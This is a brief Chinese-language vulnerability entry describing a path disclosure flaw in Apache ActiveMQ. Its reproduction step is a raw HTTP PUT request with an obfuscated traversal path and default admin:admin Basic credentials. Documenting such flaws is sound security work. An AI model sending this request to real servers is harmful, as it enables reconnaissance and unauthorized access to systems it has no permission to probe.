<section data-v-419f5ab5="" class="markdown-section markdown-body"><h1 id="activemq物理路径泄漏漏洞">ActiveMQ物理路径泄漏漏洞</h1>
<h2 id="一漏洞简介">一、漏洞简介</h2>
<p>ActiveMQ默认开启PUT请求，当开启PUT时，构造好Payload(即不存在的目录)，Response会返回相应的物理路径信息</p>
<h2 id="二漏洞影响">二、漏洞影响</h2>
<h2 id="三复现过程">三、复现过程</h2>
<pre><code class="language-html">Request Raw:
PUT /fileserver/a../../%08/..%08/.%08/%08 HTTP/1.1
Host: 192.168.197.25:8161
Authorization: Basic YWRtaW46YWRtaW4=
Content-Length: 4
</code></pre>
</section>
